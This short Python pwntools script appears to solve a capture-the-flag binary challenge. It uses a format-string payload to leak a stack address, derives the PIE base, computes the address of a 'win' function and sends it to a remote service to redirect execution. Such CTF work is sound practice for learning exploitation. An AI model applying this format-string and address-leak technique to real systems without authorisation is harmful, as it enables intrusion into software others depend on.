from pwn import ELF, process, log


def exploit(binary: ELF, io: process):
    io.recvuntil(b"Enter your name:")

    io.sendline(b"%19$p ")
    leak = int(io.recvline().strip(), 16)

    main_offset = binary.symbols["main"]
    win_offset = binary.symbols["win"]
    pie_base = leak - main_offset - 65
    win_addr = pie_base + win_offset

    log.info(f"PIE base: {hex(pie_base)}")
    log.info(f"win() address: {hex(win_addr)}")

    io.recvuntil(b"0x12345:")
    io.sendline(hex(win_addr))


if __name__ == "__main__":
    import sys
    from pwn import context, remote, ELF

    context.log_level = "debug"

    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <host> <port> <binary>")
        exit()

    binary = ELF(sys.argv[3])

    try:
        io = remote(sys.argv[1], int(sys.argv[2]))
    except Exception:
        exit()

    exploit(binary, io)

    try:
        print(io.recvall().decode(errors="ignore"))
    except EOFError:
        raise EOFError("Failed to receive all output.")
